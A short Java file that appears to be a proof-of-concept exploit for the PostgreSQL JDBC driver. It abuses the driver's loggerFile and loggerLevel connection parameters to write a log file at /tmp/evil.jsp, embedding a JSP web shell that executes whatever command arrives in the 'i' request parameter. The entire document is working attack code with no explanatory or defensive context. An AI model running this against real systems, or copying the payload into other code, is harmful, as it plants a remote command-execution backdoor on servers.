import java.sql.DriverManager;

public class Test {
    public static void main(String[] args){
        String loggerLevel = "DEBUG";
        String loggerFile = "/tmp/evil.jsp";
        String EvilContent = "<%Runtime.getRuntime().exec(request.getParameter(\"i\"));%>";
        String url = String.format("jdbc:postgresql://127.0.0.1:22/test?loggerLevel=%s&loggerFile=%s&%s", loggerLevel, loggerFile, EvilContent);
        try {
            DriverManager.getConnection(url);
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
